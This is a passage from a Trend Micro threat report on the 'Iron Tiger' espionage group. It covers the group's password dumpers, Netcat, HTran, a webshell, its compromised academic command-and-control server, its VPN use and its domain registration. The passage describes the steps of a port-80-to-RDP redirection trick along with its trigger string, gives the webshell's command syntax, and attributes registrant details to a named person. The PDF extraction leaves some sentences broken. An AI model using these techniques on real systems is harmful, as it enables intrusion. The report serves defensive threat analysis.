file system.GSecDumpGSecDump is a free publicly available password dumper. It has been used for years by various threat actors and legitimate security auditors alike. Nearly all threat actors slightly modified the GSecDump binary to detected by Trend Micro as HKTL_PWDump), along with its source code, are also publicly available for free on url The actors, however, compiled their own version in June 2012, a month after the release of the original code. This showed that they closely monitored such security tool updates.41 | Operation Iron TigerGetPassword_x64(SHA-1: detected by Trend Micro as HKTL_PWDump) is a password dumper specifically for 64-bit systems. It is also publicly available. It has the debug string, “C:\Users\K8team\Desktop\GetPassword\ Debug x64\GetPassword.pdb,” in its binary that points to its developer, K8Team.ReadPWD86Sample output of GetPassword_x64.exesystems ReadPWD86 files. It has a pretty straightforward purpose.EFH3/1F’s outputNBTScanNBTScan is a free publicly available tool that scans for open NETBIOS name servers on a local or remote TCP/IP network. Its functionality is based on that of standard Windows tool, nbtstat, though it operates on several addresses instead of just one.42 | Operation Iron TigerNBTScan’s optionsNetcatNetcat or nc.exe is a popular tool among network administrators and security auditors. It is often referred to as the “Swiss Army knife” of network-related tools. It allows users to read and write data across TCP or UDP network connections. While it is a very simple tool, it can do a lot of things, including opening a port and listening for connections, executing remote shells, and others. The nc.exe binary is signed with a SoftCamp file certificate.Nc.exe’s options43 | Operation Iron TigerHTranHTran is very popular among Chinese threat actors. It is a network communication bouncer that allows attackers to use compromised machines as pivot to access other unreachable systems, for one. We found a also HKTL_HTRan) of this tool used in attacks. Both were named “websys.exe.” The packed HTran version was also signed with a SoftCamp file certificate.HTran command-line toolUnknown redirection toolkitThough we could not identify this toolkit’s name, we found that it comprised netcat and two files—drivers. PORTCON). It is very rarely seen in targeted attack campaigns.Attackers who want to access RDP 3389 via port 80 on an IIS server configured to only leave port 80 open can use this toolkit, among others. We saw attackers:• Execute drivers.exe on the IIS server, which installs a Network Driver Interface Specification (NDIS)driver• Run ChangePort.exe to map any port to port 3389 on the IIS server• Execute nc.exe and access the target server via port 80• When a connection has been established, send the special string, “Send chkroot2007,” and disconnect• An RDP client can now be connected to a target system’s port 80 while all network traffic is redirectedto port 3389Because the attackers identified themselves by sending the special string, only their traffic is redirected. Everyone else’s will be unaffected and stay on port 80.44 | Operation Iron TigerZval.jspZval.jsp is not a standalone WebShell, it needs a client to run on compromised servers. All commands are passed with the parameter, /[REDACTED].jsp?[Password]=[Command]&z1=[Argument]&z2=[Argument]. The Trend Micro as HKTL_Proxy). It is a very basic HTTP/SOCKS proxy, which is a slightly modified version of the publicly available SOCKS v4 && v5 && Http Proxy V2.0 by LZX.Other toolsIn addition to the above-mentioned tools, the actors also use legitimate tools, including:• Local.exe from Microsoft’s Resource Kit, which enumerates the members of local groups on remoteservers or domains• Microsft’s PsGetSid.exe, which allows users to translate SIDs into display names and vice versa•Joeware.net’s GetUserinfofound old exploitsWe also (SHA-1: VPN’s services.Compromised C&C serversIron Tiger successfully compromised an Asian academic institution’s server to act as C&C server and stolen data drop zone for dnstunclient. It was also accessed by a PlugX variant through a subdomain of shangxian. info. We decided not to disclose this subdomain though since it can reveal the academic institution’s name.This server was poorly configured. It was also used by warez distributors, in addition to the actors. The warez distributors used it to store videos for virtually anyone on the Internet. FTP access to it did not require authentication. As such, anyone can use its various folders. One user even created a folder with a funny name just to show how poorly secured the server was.Data collected from C&C serversWe were able to gather a lot of information from Iron Tiger’s main C&C server—the academic institution’s compromised server.Network connections made to C&C serversSeveral network connections made via RDP were seen. This is not surprising, as the protocol is used to access remote computers from different geographical locations. The actors accessed the C&C server using KoreaIP addresses that the actors use to access the C&C server46 | Operation Iron TigerThe computer name, “YOUSISTE,” frequently accessed the server, though we did not find useful information on it. Interestingly, two different computers used the same IP address to access the C&C server. An attacker could have used two computers to access the server or several attackers could have used the same attack infrastructure.We believe the RDP connections were aided by VPN services and/or compromised computers, making the used as a data-exfiltration channel, was also seen.Attackers’ local accountA single user account named “xss” was created on the C&C server (compromised Windows Server® 2003) on 14 September 2014. It used the password, “woshinidie,” which translates to “I am your father” in Pinyin. Pinyin is the official phonetic system for transcribing Mandarin pronunciations of Chinese characters into the Latin alphabet. This password could be a funny reference to “Star Wars.”The letters, “xss,” also seen in the Blogspot page (xssok), were again seen in reference to the C&C server.The xss user account was used in the last quarter of 2014. It has not been used since. Instead, the real administrator account was used.Additional email accountsApart from the account used in spear-phishing campaigns, we saw the actors use additional email accounts for various purposes. They had several email accounts, mostly for testing purposes, with “phpxss” or “testxss” from providers like Gmail™, Hotmail, AOL, and Yahoo!®.The actors could be reporting to a different email address per victim. They, for instance, sent a list of files from a compromised system to a specific email address, which indicated the progress made. It is not clear, however, if the receiver was a member of the group or a third party that provided expert services to let attackers know which files were worth stealing.Extensive use of BAIGE VPN’s servicesPhpxss extensively used BAIGE VPN’s servers, which were mostly located in China (a little more than 500 different IP addresses). Some servers were located in the US, Canada, Hong Kong, Russia, Taiwan, Japan, and South Korea.47 | Operation Iron TigerChina 0.17%Countries where BAIGE VPN servers were locatedBAIGE VPN offers very affordable services. Its most expensive offering was a one-year subscription worth 130 Yuan (around €19). Its Windows client is pretty straightforward.BAIGE VPN’s service prices48 | Operation Iron TigerBAIGE VPN’s client GUIWhile phpxss appears to use this service, it may not be the only one. To ensure anonymity, attackers normally hid behind several layers or VPNs or proxies.BAIGE VPN does not accept customers outside China. Itimmediately filters out external connections via a registrationpage.Domain registrationIron Tiger used several legitimate online services for its infrastructure but also employed registered domains.Shangxian.infoOne of shangxian.info’s subdomains was configured to point to the main C&C server’s IP address. The domain was registered by phpxss.Interestingly, one user named “myershao” uses the exact same password as phpxss to create a local account on a compromised machine. A familiar email address, [REDACTED]o @ live . cn, was also seen.49 | Operation Iron TigerPi.mai1.infoPi.mai1.info was used in relation to two malware families at the same time—Gh0st and PlugX. These served as file attachments in a spear-phishing campaign RAR file named “documentation.rar” contained a dropper (SHA-1: In one campaign, a configuration leaked the nickname, “2shao,” which we were not able to tie to a real person’s identity or profile.Mai1.info’s registration information has changed several times. It showed references to supposed identities in Russia or the US at the time it was being actively used by malware. It had matching elements tied to [REDACTED]o @ live . cn and Guo Fei.Registrant Name: Guo Fei [REDACTED] Registrant Organization: Registrant Street1: He Nan Sheng Huo Jia Xian Registrant City: XinXiang Registrant State/Province: HeNan Registrant Postal Code: 0373 Registrant Country: CN Registrant Phone: +86.[REDACTED]39262 Registrant Email: [REDACTED]o @ live . cnMai1.info’s registration information50 | Operation Iron TigerMitigation: Combating cyber espionage and targeted attacksForeign spies in espionage films help their nations obtain competitive advantages over others by jumping seemingly impossible hoops and hurdles. These days, spying happens in cyberspace where threat actors are aided by either ready-made or customized tools and social engineering lures.We saw cyberspies with digital roots in China target high-technology organizations from the US, but not before spending years extracting information from targets in Asia-Pacific, including their own country. Iron Tiger, which could be part of a larger campaign where actors are assigned specific targets to monitor, particularly trailed its sights on obtaining defense-related information. It is believed to have stolen up to terabytes of data, given that an organization lost 58GB alone.Targets face serious repercussions, given the sensitive nature of the data they keep. The data the actors stole, after all, translates to years of invaluable government and corporate research and development (R&D) dollars.For nation-states like the US and China, cyber espionage may not come as a surprise. Several campaigns like Pawn Storm and Arid Viper have already taken advantage of the weakest links across industries to gain counterintelligence or perform industrial espionage on perceived foes.Questions with regard to threat mitigation remain. Thwarting cyber attacks should not rely on off-the-shelf, traditional anti-malware solutions alone. Sensitive data requires custom defense and multilayer protection that can’t be easily rendered useless by spear-phishing campaigns and malware attacks. Organizations need to gather threat intelligence to combat cyber espionage and protect against targeted attacks. They should operate under the assumption that their network has already been compromised.51 | Operation Iron TigerReferences1. CrowdStrike. (2013). “CrowdStrike Global Threat Report: 2013 Year in Review.” Last accessed 14 September 2015, url CrowdStrike_2013_Global_Threat_Intel_Report.pdf.2. Dell SecureWorks. (5 August 2015). Dell SecureWorks. “Threat Group-3390 Targets Organizations for Cyber Espionage.” Last accessed on 14 September 2015, url intelligence/threats/threat-group-3390-targets-organizations-for-cyberespionage/.3. Feike Hacquebord. (18 August 2015). TrendLabs Security Intelligence Blog. “Pawn Storm’s Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets.” Last accessed on 9 September 2015, url campaign-revealed-ukraine-and-us-top-global-targets/.4. China Vitae. (2003–2015). China Vitae. “Han Zheng 韩正.” Last accessed on 9 September 2015, url TrendLabs. (8 December 2014). Trend Micro Security News. “The Hack of Sony Pictures: What We Know and What You Need to Know.” Last accessed on 9 September 2015, url com/vinfo/us/security/news/cyber-attacks/the-hack-of-sony-pictures-what-you-need-to-know.6. Keith Tyler. (16 November 2012). Information on Security. “China Chopper WebShell—The 4KB That Owns Your Web Server.” Last accessed on 10 September 2015, url blogspot.fr/2012/11/china-chopper-webshell.html.7. Ryan Angelo Certeza. (4 October 2012). Threat Encyclopedia. “Pulling the Plug on PlugX.” Last accessed on 11 September 2015, url attack/112/pulling-the-plug-on-plugx.8. Jaime Blasco. (13 September 2012). The AlienVault Blogs: Taking On Today’s Threats. “Tracking Down the Author of the PlugX RAT.” Last accessed on 11 September 2015, url com/open-threat-exchange/blog/tracking-down-the-author-of-the-plugx-rat.9. Leo Davidson. (2009). <<pretentious/name>>. “Windows 7 UAC Whitelist: Proof-of-Concept Source Code.” Last accessed on 11 September 2015, url Win7Elevate_Inject.cpp.html.52 | Operation Iron TigerCreated by:The Global Technical Support and R&D Center of TREND MICRO 